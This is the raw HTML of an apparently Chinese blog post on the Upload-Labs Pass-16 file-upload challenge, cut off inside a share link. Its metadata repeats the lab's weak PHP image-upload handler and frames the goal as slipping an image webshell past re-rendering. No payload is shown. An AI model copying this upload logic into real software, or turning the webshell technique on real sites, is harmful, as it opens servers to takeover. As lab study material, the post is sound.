<!doctype html><html lang=en><head><link rel=preload href=/lib/font-awesome/webfonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/lib/font-awesome/webfonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/lib/font-awesome/webfonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin=anonymous><link rel=preload href=/lib/JetBrainsMono/web/woff2/JetBrainsMono-Regular.woff2 as=font type=font/woff2 crossorigin=anonymous><script src=https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js></script><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>Upload-Labs之Pass-16 | </title><link rel=canonical href=/posts/ctf/upload-labs4/><meta name=description content="为世界上所有的美好而战"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="all,follow"><meta name=googlebot content="index,follow,snippet,archive"><meta property="og:url" content="/posts/ctf/upload-labs4/"><meta property="og:title" content="Upload-Labs之Pass-16"><meta property="og:description" content='前言 ​	我在这道题上花了快一天的时间，但是也学到了不少姿势，觉得东西应该足够多，而且参考了的博客发现这道题算是有歧义的，不知道作者想要考察的点是哪一个，所以算是有两种解法吧，可惜的是两种方法都不算是大成功，只有部分成功执行了。
​	参考博客：upload-labs之pass 16详细分析
Pass-16 ​	源码（三种图片的判定，只贴一个吧，篇幅小一点）：
$is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])){ // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $filetype = $_FILES[&#39;upload_file&#39;][&#39;type&#39;]; $tmpname = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $target_path=UPLOAD_PATH.&#39;/&#39;.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,"."),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == "jpg") && ($filetype=="image/jpeg")){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = "该文件不是jpg格式的图片！"; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).".jpg"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = "上传出错！"; } }else if(($fileext == "png") && ($filetype=="image/png")){ ...... }else if(($fileext == "gif") && ($filetype=="image/gif")){ ..... }else{ $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！"; } } ​	提示：本pass重新渲染了图片！。说明对图片进行了二次渲染，我的理解就是把上传的图片，根据一些标准，只把图片中的图片信息提取出来，再生成一个图片，可以有效避免图片马。'><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-11-16T22:50:25+00:00"><meta property="article:modified_time" content="2020-11-16T22:50:25+00:00"><meta property="article:tag" content="文件上传漏洞"><meta name=twitter:card content="summary"><meta name=twitter:title content="Upload-Labs之Pass-16"><meta name=twitter:description content='前言 ​	我在这道题上花了快一天的时间，但是也学到了不少姿势，觉得东西应该足够多，而且参考了的博客发现这道题算是有歧义的，不知道作者想要考察的点是哪一个，所以算是有两种解法吧，可惜的是两种方法都不算是大成功，只有部分成功执行了。
​	参考博客：upload-labs之pass 16详细分析
Pass-16 ​	源码（三种图片的判定，只贴一个吧，篇幅小一点）：
$is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])){ // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $filetype = $_FILES[&#39;upload_file&#39;][&#39;type&#39;]; $tmpname = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $target_path=UPLOAD_PATH.&#39;/&#39;.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,"."),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == "jpg") && ($filetype=="image/jpeg")){ if(move_uploaded_file($tmpname,$target_path)){ //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false){ $msg = "该文件不是jpg格式的图片！"; @unlink($target_path); }else{ //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).".jpg"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; } } else { $msg = "上传出错！"; } }else if(($fileext == "png") && ($filetype=="image/png")){ ...... }else if(($fileext == "gif") && ($filetype=="image/gif")){ ..... }else{ $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！"; } } ​	提示：本pass重新渲染了图片！。说明对图片进行了二次渲染，我的理解就是把上传的图片，根据一些标准，只把图片中的图片信息提取出来，再生成一个图片，可以有效避免图片马。'><link rel=stylesheet href=/css/styles.c05d68261bf086a9d7713c4f8a6215a3601608e267a816a7ee58f139b3d1aae51222aae2081c8e0c6bd35e1334773b7a16283022f31f92afd93bb37e5e822e66.css integrity="sha512-wF1oJhvwhqnXcTxPimIVo2AWCOJnqBan7ljxObPRquUSIqriCByODGvTXhM0dzt6FigwIvMfkq/ZO7N+XoIuZg=="><!--[if lt IE 9]><script src=https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js></script><script src=https://oss.maxcdn.com/respond/1.4.2/respond.min.js></script><![endif]--><link rel=icon type=image/png href=/images/favicon.ico></head><body class="max-width mx-auto px3 ltr"><div class="content index py4"><div id=header-post><a id=menu-icon href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=menu-icon-tablet href=#><i class="fas fa-bars fa-lg"></i></a>
<a id=top-icon-tablet href=# onclick='$("html, body").animate({scrollTop:0},"fast")' style=display:none aria-label="Top of Page"><i class="fas fa-chevron-up fa-lg"></i></a>
<span id=menu><span id=nav><ul><li><a href=/>Home</a></li><li><a href=/posts>Writings</a></li><li><a href=/tags>Tags</a></li><li><a href=/about>About</a></li><li><a href=/friends>Friends</a></li><li><a href>开往</a></li></ul></span><br><span id=actions><ul><li><a class=icon href=/posts/ctf/upload-labs3/ aria-label=Previous><i class="fas fa-chevron-left" aria-hidden=true onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class=icon href=/posts/ctf/upload-labs5/ aria-label=Next><i class="fas fa-chevron-right" aria-hidden=true onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class=icon href=# onclick='$("html, body").animate({scrollTop:0},"fast")' aria-label="Top of Page"><i class="fas fa-chevron-up" aria-hidden=true onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class=icon href=# aria-label=Share><i class="fas fa-share-alt" aria-hidden=true onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id=i-prev class=info style=display:none>Previous post</span>
<span id=i-next class=info style=display:none>Next post</span>
<span id=i-top class=info style=display:none>Back to top</span>
<span id=i-share class=info style=display:none>Share post</span></span><br><div id=share style=display:none><ul><li><a class=icon href="http://www.facebook.com/sharer.php?u=%2fposts%2fctf%2fupload-labs4%2f" aria-label=Facebook><i class="fab fa-facebook" aria-hidden=true></i></a></li><li><a class=icon href="https://twitter.com/share?url=%2fposts%2fctf%2fupload-labs4%2f&text=Upload-Labs%e4%b9%8bPass-16" aria-label=Twitter><i class="fab fa-twitter" aria-hidden=true></i></a></li><li><a class=icon href="http://www.linkedin.com/shareArticle?url=%2fposts%2fctf%2fupload-labs4%2f&title=Upload-Labs%e4%b9%8bPass-16" aria-label=Linkedin><i class="fab fa-linkedin" aria-hidden=true></i></a></li><li><a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=%2fposts%2fctf%2fupload-labs4%2f&is_video=false&description=Upload-Labs%e4%b9%8bPass-16" aria-label=Pinterest><i class="fab fa-pinterest" aria-hidden=true></i></a></li><li><a class=icon href="mailto:?subject=Upload-Labs%e4%b9%8bPass-16&body=Check out this article: %2fposts%2fctf%2fupload-labs4%2f" aria-label=Email><i class="fas fa-envelope" aria-hidden=true></i></a></li><li><a class=icon href="https://getpocket.com/save?url=%2fposts%2fctf%2fupload-labs4%2f&title=Upload-Labs%e4%b9%8bPass-16" aria-label=Pocket><i class="fab fa-get-pocket" aria-hidden=true></i></a></li><li><a class=icon href="http://reddit.com/submit?url=%2fposts%2fctf%2fupload-labs4%2f&title=Upload-Labs%e4%b9%8bPass-16" aria-label=reddit><i class="fab fa-reddit" aria-hidden=true></i></a></li><li><a class=icon href="http://www.tumblr.com/share/link?url=%2fposts%2fctf%2fupload-labs4%2f&name=Upload-Labs%e4%b9%8bPass-16&description=%3ch2%20id%3d%22%e5%89%8d%e8%a8%80%22%3e%e5%89%8d%e8%a8%80%3c%2fh2%3e%0a%3cp%3e%e2%80%8b%09%e6%88%91%e5%9c%a8%e8%bf%99%e9%81%93%e9%a2%98%e4%b8%8a%e8%8a%b1%e4%ba%86%e5%bf%ab%e4%b8%80%e5%a4%a9%e7%9a%84%e6%97%b6%e9%97%b4%ef%bc%8c%e4%bd%86%e6%98%af%e4%b9%9f%e5%ad%a6%e5%88%b0%e4%ba%86%e4%b8%8d%e5%b0%91%e5%a7%bf%e5%8a%bf%ef%bc%8c%e8%a7%89%e5%be%97%e4%b8%9c%e8%a5%bf%e5%ba%94%e8%af%a5%e8%b6%b3%e5%a4%9f%e5%a4%9a%ef%bc%8c%e8%80%8c%e4%b8%94%e5%8f%82%e8%80%83%e4%ba%86%e7%9a%84%e5%8d%9a%e5%ae%a2%e5%8f%91%e7%8e%b0%e8%bf%99%e9%81%93%e9%a2%98%e7%ae%97%e6%98%af%e6%9c%89%e6%ad%a7%e4%b9%89%e7%9a%84%ef%bc%8c%e4%b8%8d%e7%9f%a5%e9%81%93%e4%bd%9c%e8%80%85%e6%83%b3%e8%a6%81%e8%80%83%e5%af%9f%e7%9a%84%e7%82%b9%e6%98%af%e5%93%aa%e4%b8%80%e4%b8%aa%ef%bc%8c%e6%89%80%e4%bb%a5%e7%ae%97%e6%98%af%e6%9c%89%e4%b8%a4%e7%a7%8d%e8%a7%a3%e6%b3%95%e5%90%a7%ef%bc%8c%e5%8f%af%e6%83%9c%e7%9a%84%e6%98%af%e4%b8%a4%e7%a7%8d%e6%96%b9%e6%b3%95%e9%83%bd%e4%b8%8d%e7%ae%97%e6%98%af%e5%a4%a7%e6%88%90%e5%8a%9f%ef%bc%8c%e5%8f%aa%e6%9c%89%e9%83%a8%e5%88%86%e6%88%90%e5%8a%9f%e6%89%a7%e8%a1%8c%e4%ba%86%e3%80%82%3c%2fp%3e%0a%3cp%3e%e2%80%8b%09%e5%8f%82%e8%80%83%e5%8d%9a%e5%ae%a2%ef%bc%9a%3ca%20href%3d%22https%3a%2f%2fxz.aliyun.com%2ft%2f2657%23toc-4%22%3eupload-labs%e4%b9%8bpass%2016%e8%af%a6%e7%bb%86%e5%88%86%e6%9e%90%3c%2fa%3e%3c%2fp%3e%0a%3ch2%20id%3d%22pass-16%22%3ePass-16%3c%2fh2%3e%0a%3cp%3e%e2%80%8b%09%e6%ba%90%e7%a0%81%ef%bc%88%e4%b8%89%e7%a7%8d%e5%9b%be%e7%89%87%e7%9a%84%e5%88%a4%e5%ae%9a%ef%bc%8c%e5%8f%aa%e8%b4%b4%e4%b8%80%e4%b8%aa%e5%90%a7%ef%bc%8c%e7%af%87%e5%b9%85%e5%b0%8f%e4%b8%80%e7%82%b9%ef%bc%89%ef%bc%9a%3c%2fp%3e%0a%3cdiv%20class%3d%22highlight%22%3e%3cpre%20tabindex%3d%220%22%20style%3d%22color%3a%23f8f8f2%3bbackground-color%3a%23272822%3b-moz-tab-size%3a4%3b-o-tab-size%3a4%3btab-size%3a4%3b%22%3e%3ccode%20class%3d%22language-php%22%20data-lang%3d%22php%22%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%24is_upload%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3efalse%3c%2fspan%3e%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%24msg%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3enull%3c%2fspan%3e%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%2366d9ef%22%3eif%3c%2fspan%3e%20%28%3cspan%20style%3d%22color%3a%23a6e22e%22%3eisset%3c%2fspan%3e%28%24_POST%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3bsubmit%26%2339%3b%3c%2fspan%3e%5d%29%29%7b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%3cspan%20style%3d%22color%3a%2375715e%22%3e%2f%2f%20%e8%8e%b7%e5%be%97%e4%b8%8a%e4%bc%a0%e6%96%87%e4%bb%b6%e7%9a%84%e5%9f%ba%e6%9c%ac%e4%bf%a1%e6%81%af%ef%bc%8c%e6%96%87%e4%bb%b6%e5%90%8d%ef%bc%8c%e7%b1%bb%e5%9e%8b%ef%bc%8c%e5%a4%a7%e5%b0%8f%ef%bc%8c%e4%b8%b4%e6%97%b6%e6%96%87%e4%bb%b6%e8%b7%af%e5%be%84%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%2375715e%22%3e%3c%2fspan%3e%20%20%20%20%24filename%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%24_FILES%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3bupload_file%26%2339%3b%3c%2fspan%3e%5d%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3bname%26%2339%3b%3c%2fspan%3e%5d%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%24filetype%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%24_FILES%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3bupload_file%26%2339%3b%3c%2fspan%3e%5d%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3btype%26%2339%3b%3c%2fspan%3e%5d%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%24tmpname%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%24_FILES%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3bupload_file%26%2339%3b%3c%2fspan%3e%5d%5b%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3btmp_name%26%2339%3b%3c%2fspan%3e%5d%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%24target_path%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23a6e22e%22%3eUPLOAD_PATH%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23f92672%22%3e.%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3b%2f%26%2339%3b%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23f92672%22%3e.%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23a6e22e%22%3ebasename%3c%2fspan%3e%28%24filename%29%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%3cspan%20style%3d%22color%3a%2375715e%22%3e%2f%2f%20%e8%8e%b7%e5%be%97%e4%b8%8a%e4%bc%a0%e6%96%87%e4%bb%b6%e7%9a%84%e6%89%a9%e5%b1%95%e5%90%8d%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%2375715e%22%3e%3c%2fspan%3e%20%20%20%20%24fileext%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23a6e22e%22%3esubstr%3c%2fspan%3e%28%3cspan%20style%3d%22color%3a%23a6e22e%22%3estrrchr%3c%2fspan%3e%28%24filename%2c%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3b.%26%2334%3b%3c%2fspan%3e%29%2c%3cspan%20style%3d%22color%3a%23ae81ff%22%3e1%3c%2fspan%3e%29%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%3cspan%20style%3d%22color%3a%2375715e%22%3e%2f%2f%e5%88%a4%e6%96%ad%e6%96%87%e4%bb%b6%e5%90%8e%e7%bc%80%e4%b8%8e%e7%b1%bb%e5%9e%8b%ef%bc%8c%e5%90%88%e6%b3%95%e6%89%8d%e8%bf%9b%e8%a1%8c%e4%b8%8a%e4%bc%a0%e6%93%8d%e4%bd%9c%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%2375715e%22%3e%3c%2fspan%3e%20%20%20%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3eif%3c%2fspan%3e%28%28%24fileext%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3bjpg%26%2334%3b%3c%2fspan%3e%29%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%26amp%3b%26amp%3b%3c%2fspan%3e%20%28%24filetype%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3d%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3bimage%2fjpeg%26%2334%3b%3c%2fspan%3e%29%29%7b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3eif%3c%2fspan%3e%28%3cspan%20style%3d%22color%3a%23a6e22e%22%3emove_uploaded_file%3c%2fspan%3e%28%24tmpname%2c%24target_path%29%29%7b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%3cspan%20style%3d%22color%3a%2375715e%22%3e%2f%2f%e4%bd%bf%e7%94%a8%e4%b8%8a%e4%bc%a0%e7%9a%84%e5%9b%be%e7%89%87%e7%94%9f%e6%88%90%e6%96%b0%e7%9a%84%e5%9b%be%e7%89%87%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%2375715e%22%3e%3c%2fspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%24im%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23a6e22e%22%3eimagecreatefromjpeg%3c%2fspan%3e%28%24target_path%29%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3eif%3c%2fspan%3e%28%24im%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3efalse%3c%2fspan%3e%29%7b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24msg%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3b%e8%af%a5%e6%96%87%e4%bb%b6%e4%b8%8d%e6%98%afjpg%e6%a0%bc%e5%bc%8f%e7%9a%84%e5%9b%be%e7%89%87%ef%bc%81%26%2334%3b%3c%2fspan%3e%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%40%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23a6e22e%22%3eunlink%3c%2fspan%3e%28%24target_path%29%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%7d%3cspan%20style%3d%22color%3a%2366d9ef%22%3eelse%3c%2fspan%3e%7b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3cspan%20style%3d%22color%3a%2375715e%22%3e%2f%2f%e7%bb%99%e6%96%b0%e5%9b%be%e7%89%87%e6%8c%87%e5%ae%9a%e6%96%87%e4%bb%b6%e5%90%8d%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%2375715e%22%3e%3c%2fspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3cspan%20style%3d%22color%3a%23a6e22e%22%3esrand%3c%2fspan%3e%28%3cspan%20style%3d%22color%3a%23a6e22e%22%3etime%3c%2fspan%3e%28%29%29%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24newfilename%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23a6e22e%22%3estrval%3c%2fspan%3e%28%3cspan%20style%3d%22color%3a%23a6e22e%22%3erand%3c%2fspan%3e%28%29%29%3cspan%20style%3d%22color%3a%23f92672%22%3e.%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3b.jpg%26%2334%3b%3c%2fspan%3e%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3cspan%20style%3d%22color%3a%2375715e%22%3e%2f%2f%e6%98%be%e7%a4%ba%e4%ba%8c%e6%ac%a1%e6%b8%b2%e6%9f%93%e5%90%8e%e7%9a%84%e5%9b%be%e7%89%87%ef%bc%88%e4%bd%bf%e7%94%a8%e7%94%a8%e6%88%b7%e4%b8%8a%e4%bc%a0%e5%9b%be%e7%89%87%e7%94%9f%e6%88%90%e7%9a%84%e6%96%b0%e5%9b%be%e7%89%87%ef%bc%89%0a%3c%2fspan%3e%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%3cspan%20style%3d%22color%3a%2375715e%22%3e%3c%2fspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24img_path%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23a6e22e%22%3eUPLOAD_PATH%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23f92672%22%3e.%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2339%3b%2f%26%2339%3b%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23f92672%22%3e.%3c%2fspan%3e%24newfilename%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3cspan%20style%3d%22color%3a%23a6e22e%22%3eimagejpeg%3c%2fspan%3e%28%24im%2c%24img_path%29%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%40%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23a6e22e%22%3eunlink%3c%2fspan%3e%28%24target_path%29%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24is_upload%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3etrue%3c%2fspan%3e%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%7d%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%7d%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3eelse%3c%2fspan%3e%20%7b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%20%20%20%20%24msg%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3b%e4%b8%8a%e4%bc%a0%e5%87%ba%e9%94%99%ef%bc%81%26%2334%3b%3c%2fspan%3e%3b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%7d%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%7d%3cspan%20style%3d%22color%3a%2366d9ef%22%3eelse%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3eif%3c%2fspan%3e%28%28%24fileext%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3bpng%26%2334%3b%3c%2fspan%3e%29%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%26amp%3b%26amp%3b%3c%2fspan%3e%20%28%24filetype%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3d%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3bimage%2fpng%26%2334%3b%3c%2fspan%3e%29%29%7b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%3cspan%20style%3d%22color%3a%23f92672%22%3e......%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%7d%3cspan%20style%3d%22color%3a%2366d9ef%22%3eelse%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%2366d9ef%22%3eif%3c%2fspan%3e%28%28%24fileext%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3d%3c%2fspan%3e%20%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3bgif%26%2334%3b%3c%2fspan%3e%29%20%3cspan%20style%3d%22color%3a%23f92672%22%3e%26amp%3b%26amp%3b%3c%2fspan%3e%20%28%24filetype%3cspan%20style%3d%22color%3a%23f92672%22%3e%3d%3d%3c%2fspan%3e%3cspan%20style%3d%22color%3a%23e6db74%22%3e%26%2334%3bimage%2fgif%26%2334%3b%3c%2fspan%3e%29%29%7b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%20%20%20%3cspan%20style%3d%22color%3a%23f92672%22%3e.....%3c%2fspan%3e%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%7d%3cspan%20style%3d%22color%3a%2366d9ef%22%3eelse%3c%2fspan%3e%7b%0a%3c%2fspan%3e%3c%2fspan%3e%3cspan%20style%3d%22display%3aflex%3b%22%3e%3cspan%3e%20%20%20%20%20%